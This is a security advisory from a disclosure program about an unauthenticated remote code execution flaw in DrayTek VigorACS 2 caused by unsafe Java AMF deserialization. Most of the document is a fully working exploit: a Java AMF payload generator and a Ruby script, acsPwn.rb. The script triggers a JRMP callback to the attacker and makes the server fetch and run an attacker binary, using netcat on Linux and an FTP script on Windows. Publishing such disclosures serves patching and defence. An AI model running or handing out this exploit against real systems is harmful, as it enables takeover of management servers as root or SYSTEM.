**Vulnerability Summary**<br>
A vulnerability in Vigor ACS allows unauthenticated users to cause the product to execute arbitrary code.

VigorACS 2 “is a powerful centralized management software for Vigor Routers and VigorAPs, it is an integrated solution for configuring, monitoring, and maintenance of multiple Vigor devices from a single portal. VigorACS 2 is based on TR-069 standard, which is an application layer protocol that provides the secure communication between the server and CPEs, and allows Network Administrator to manage all the Vigor devices (CPEs) from anywhere on the Internet. VigorACS 2 Central Management is suitable for the enterprise customers with a large scale of DrayTek routers and APs, or the System Integrator who need to provide a real-time service for their customer’s DrayTek devices.”

**Credit**<br>
An independent security researcher, Pedro Ribeiro, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Vendor Response**<br>
“We’ll release the new version 2.2.2 to resolve this problem and inform the user about the CVE ID and reporter.
The release note will be updated on Wednesday (Apr 4, 2018).<br>
Kindly let me know if you have further question, thank you!”

**Vulnerability Details**<br>
VigorACS is a Java application that runs on both Windows and Linux. It exposes a number of servlets / endpoints under /ACSServer, which are used for various functions of VigorACS, such as the management of routers and firewalls using the TR-069 protocol [2].

One of the endpoints exposed by VigorACS, at /ACSServer/messabroker/amf, is an Adobe/Apache Flex service that is reachable by the managed routers and firewalls. This advisory shows that VigorACS uses a Flex version is vulnerable to CVE-2017-5641 [3], a vulnerability related to unsafe Java deserialization for Flex AMF

**Technical Details**<br>
By sending an HTTP POST request with random data to /ACSServer/messagebroker/amf, the server will respond with a 200 OK and binary data that includes:
` ...Unsupported AMF version XXXXX...`

While in the server logs, a stack trace will be produced that includes the following:

`flex.messaging.io.amf.AmfMessageDeserializer.readMessage ...`
`flex.messaging.endpoints.amf.SerializationFilter.invoke ...`<br>
`...`

A quick Internet search revealed CVE-2017-5641 [3], which clearly states in its description:

“Previous versions of Apache Flex BlazeDS (4.7.2 and earlier) did not restrict which types were allowed for AMF(X) object deserialization by default. During the deserialization process code is executed that for several known types has undesired side-effects. Other, unknown types may also exhibit such behaviors. One vector in the Java standard library exists that allows an attacker to trigger possibly further exploitable Java deserialization of untrusted data. Other known vectors in third party libraries can be used to trigger remote code execution.”
Further reading in [4], [5] and [6] led to a proof of concept (Appendix A) that showed both on the server logs and in the HTTP responses that the deserialization could be exploited to achieve code execution.

A fully working exploit has been released with this advisory that works in the following way:
a) sends an AMF binary payload to /ACSServer/messagebroker/amf as described in [5] to trigger a Java Remote Method Protocol (JRMP) call back to the attacker<br>
b) receives the JRMP connection with ysoserial’s JRMP listener [7]<br>
c) configures ysoserial to respond with a CommonsCollections5 or CommonsCollections6 payload, as a vulnerable version of Apache Commons 3.1 is in the Java classpath of the server<br>
d) executes code as root / SYSTEM<br>

The exploit has been tested against the Linux and Windows Vigor ACS 2.2.1, although it requires a ysoserial jar patched for multi argument handling (a separate branch in [7], or alternative a ysoserial patched with CommonsCollections5Chained or CommonsCollections6Chained – see [8]).

Appendix A contains the Java code used to generate the AMF payload that will be sent in step a). This code is very similar to the one in [5], and it is highly recommended to read that advisory by Markus Wulftange of Code White for a better understanding of this vulnerability.

**Appendix A**<br>
```java
import flex.messaging.io.amf.MessageBody;
import flex.messaging.io.amf.ActionMessage;
import flex.messaging.io.SerializationContext;
import flex.messaging.io.amf.AmfMessageSerializer;
import java.io.*;
public class ACSFlex {
    public static void main(String[] args) {
        Object unicastRef = generateUnicastRef(args[0], Integer.parseInt(args[1]));
        // serialize object to AMF message
        try {
            byte[] amf = new byte[0];
            amf = serialize((unicastRef));
            DataOutputStream os = new DataOutputStream(new FileOutputStream(args[2]));
            os.write(amf);
            System.out.println("Done, payload written to " + args[2]);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static Object generateUnicastRef(String host, int port) {
        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
        return new sun.rmi.server.UnicastRef(liveRef);
    }
    public static byte[] serialize(Object data) throws IOException {
        MessageBody body = new MessageBody();
        body.setData(data);
        ActionMessage message = new ActionMessage();
        message.addBody(body);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        AmfMessageSerializer serializer = new AmfMessageSerializer();
        serializer.initialize(SerializationContext.getSerializationContext(), out, null);
        serializer.writeMessage(message);
        return out.toByteArray();
    }
}
```

**acsPwn.rb**<br>
```rb
#!/usr/bin/ruby
=begin
===
acsFlex.jar:
import flex.messaging.io.amf.MessageBody;
import flex.messaging.io.amf.ActionMessage;
import flex.messaging.io.SerializationContext;
import flex.messaging.io.amf.AmfMessageSerializer;
import java.io.*;
public class ACSFlex {
    public static void main(String[] args) {
        Object unicastRef = generateUnicastRef(args[0], Integer.parseInt(args[1]));
        // serialize object to AMF message
        try {
            byte[] amf = new byte[0];
            amf = serialize((unicastRef));
            DataOutputStream os = new DataOutputStream(new FileOutputStream(args[2]));
            os.write(amf);
            System.out.println("Done, payload written to " + args[2]);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static Object generateUnicastRef(String host, int port) {
        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
        return new sun.rmi.server.UnicastRef(liveRef);
    }
    public static byte[] serialize(Object data) throws IOException {
        MessageBody body = new MessageBody();
        body.setData(data);
        ActionMessage message = new ActionMessage();
        message.addBody(body);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        AmfMessageSerializer serializer = new AmfMessageSerializer();
        serializer.initialize(SerializationContext.getSerializationContext(), out, null);
        serializer.writeMessage(message);
        return out.toByteArray();
    }
}
===
ysoserial.jar:
- Use the multiarg branch of https://github.com/frohoff/ysoserial
- Or patch ysoserial with CommonsCollections5Chained and CommonsCollections6Chain from https://github.com/frohoff/ysoserial/issues/71
===
=end
require 'ftpd'
require 'tmpdir'
require 'net/http'
require 'uri'
class String
	def black;          "\e[30m#{self}\e[0m" end
	def red;            "\e[31m#{self}\e[0m" end
	def green;          "\e[32m#{self}\e[0m" end
	def brown;          "\e[33m#{self}\e[0m" end
	def blue;           "\e[34m#{self}\e[0m" end
	def magenta;        "\e[35m#{self}\e[0m" end
	def cyan;           "\e[36m#{self}\e[0m" end
	def gray;           "\e[37m#{self}\e[0m" end
	def bg_black;       "\e[40m#{self}\e[0m" end
	def bg_red;         "\e[41m#{self}\e[0m" end
	def bg_green;       "\e[42m#{self}\e[0m" end
	def bg_brown;       "\e[43m#{self}\e[0m" end
	def bg_blue;        "\e[44m#{self}\e[0m" end
	def bg_magenta;     "\e[45m#{self}\e[0m" end
	def bg_cyan;        "\e[46m#{self}\e[0m" end
	def bg_gray;        "\e[47m#{self}\e[0m" end
	def bold;           "\e[1m#{self}\e[22m" end
	def italic;         "\e[3m#{self}\e[23m" end
	def underline;      "\e[4m#{self}\e[24m" end
	def blink;          "\e[5m#{self}\e[25m" end
	def reverse_color;  "\e[7m#{self}\e[27m" end
end
# FTP server (Windows)
class Driver
	def initialize(temp_dir)
		@temp_dir = temp_dir
	end
	def authenticate(user, password)
		# actually the client hasn't downloaded it yet, just logged in, but whatever
		puts '[+] Payload has been downloaded, wait for execution!'.green.bold
		true
	end
	def file_system(user)
		Ftpd::DiskFileSystem.new(@temp_dir)
	end
end
def ftp_start (temp_dir, lhost, port)
	driver = Driver.new(temp_dir)
  server = Ftpd::FtpServer.new(driver)
	server.interface = lhost
  server.port = port
  server.start
end
def tcp_start (payload, port)
	pl = File.binread(payload)
	server = TCPServer.new port
	loop do
		Thread.start(server.accept) do |client|
		client.write(pl)
		client.close
		puts "[+] Payload has been downloaded, wait for execution!".green.bold
		end
	end
end
puts ""
puts "Draytek VigorACS 2 unauthenticated remote code execution (unsafe Java AMF deserialization)".cyan.bold
puts "CVE-TODO".cyan.bold
puts "Tested on version 2.2.1 for Windows and Linux, earlier versions are likely vulnerable".cyan.bold
puts "By Pedro Ribeiro (pedrib@gmail.com) / Agile Information Security".blue.bold
puts ""
if (ARGV.length < 5 || (ARGV[3] != "Linux" && ARGV[3] != "Windows") || !File.file?(ARGV[4]))
	puts "Usage: ./acsPwn.rb <rhost> <rport> <lhost> <Windows|Linux> <payload_path> [ssl]".bold
	puts "	rhost:\t\t\tDraytek Vigor ACS server host"
	puts "	rport:\t\t\tDraytek Vigor ACS server port"
	puts "	lhost:\t\t\tyour IP address"
	puts "	Windows|Linux:\t\ttarget type"
	puts "	payload_path:\t\tPath to the payload that is going to be executed in the Vigor server"
	puts "	ssl:\t\t\tConnects to Vigor server using SSL (by default uses plain HTTP)"
	puts ""
	puts "NOTES:\tThis exploit requires the ftpd gem installed and the java executable in the PATH."
	puts "\tThe included ysoserial.jar (patched for multiarg) and the included acsFlex.jar must be in the current directory."
	puts "\tTwo random TCP ports in the range 10000-65535 are used to receive connections from the target."
	puts ""
	exit(-1)
end
# we can use ysoserial's CommonsCollections5 or CommonsCollections6 exploit chain
YSOSERIAL = "ysoserial-patched.jar ysoserial.exploit.JRMPListener JRMP_PORT CommonsCollections6Chained "
WINDOWS_CMD = %{'cmd.exe /c @echo open SERVER PORT>script.txt&@echo binary>>script.txt&@echo get /PAYLOAD>>script.txt&@echo quit>>script.txt&@ftp -s:script.txt -v -A&@start PAYLOAD'}
LINUX_CMD = %{\'nc -w 2 SERVER PORT > /tmp/PAYLOAD; chmod +x /tmp/PAYLOAD; /tmp/PAYLOAD\'}
rhost = ARGV[0]
rport = ARGV[1]
lhost = ARGV[2].dup.force_encoding('ASCII')
os = ARGV[3]
payload_path = ARGV[4]
payload_name = File.basename(ARGV[4])
if ARGV.length > 5 && ARGV[5] == 'ssl'
	ssl = true
else
	ssl = false
end
Dir.mktmpdir { |temp_dir|
	server_port = rand(10000..65535)
	FileUtils.cp(payload_path, temp_dir)
	puts "[+] Picked port #{server_port} for the #{(os == 'Windows' ? 'FTP' : 'TCP')} server".cyan.bold
	# step 1: start the TCP or FTP server
	if os == 'Windows'
		ftp_start(temp_dir, lhost, server_port)
	else
		t = Thread.new{tcp_start(payload_path, server_port)}
	end
	# step 2: create the AMF payload
	puts "[+] Creating AMF payload...".green.bold
	jrmp_port = rand(10000..65535)
	amf_file = temp_dir + "/payload.ser"
	system("java -jar acsFlex.jar #{lhost} #{jrmp_port} #{amf_file}")
	amf_payload = File.binread(amf_file)
	# step 3: start the ysoserial JRMP listener
	puts "[+] Picked port #{jrmp_port} for the JRMP server".cyan.bold
	# build the command line argument that will be executed by the server
	cmd = (os == 'Windows' ? "java " : "java -Dysoserial.prefix=\'/bin/sh -c\' ")
	cmd += "-cp #{YSOSERIAL.gsub('JRMP_PORT', jrmp_port.to_s)}"
	cmd_final = (os == 'Windows' ? WINDOWS_CMD : LINUX_CMD).gsub("SERVER", lhost).gsub("PORT", server_port.to_s).gsub("PAYLOAD", payload_name)
	puts "[+] Sending command #{cmd_final}".green.bold
	jrmp_pid = spawn((cmd + cmd_final))
	sleep 5
	Process.detach(jrmp_pid)
	# step 4: fire the payload!
	uri = URI.parse("http#{ssl ? 's': ''}://#{rhost}:#{rport}")
	Net::HTTP.start(uri.host, uri.port, (ssl ? {:use_ssl => true, :verify_mode => OpenSSL::SSL::VERIFY_NONE } : {})) do |http|
		http.post('/ACSServer/messagebroker/amf', amf_payload)
	end
	puts "[+] AMF payload sent, waiting 15 seconds for payload download...".green.bold
	sleep 15
	Process.kill("HUP", jrmp_pid)
	if t
		t.terminate
	end
	puts "[*] Payload should have executed by now, exiting!".bold
}
exit 0
```

References:

[1] https://www.draytek.com/en/products/central-management/vigoracs-2/<br>
[2] https://www.draytek.com/en/faq/faq-vigoracs-si/vigoracs-2/how-to-register-a-cpe-to-vigoracs-2-server/<br>
[3] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5641<br>
[4] https://issues.apache.org/jira/browse/FLEX-35290<br>
[5] http://codewhitesec.blogspot.ru/2017/04/amf.html<br>
[6] https://github.com/mbechler/marshalsec<br>
[7] https://github.com/frohoff/ysoserial<br>
[8] https://github.com/frohoff/ysoserial/issues/71<br>
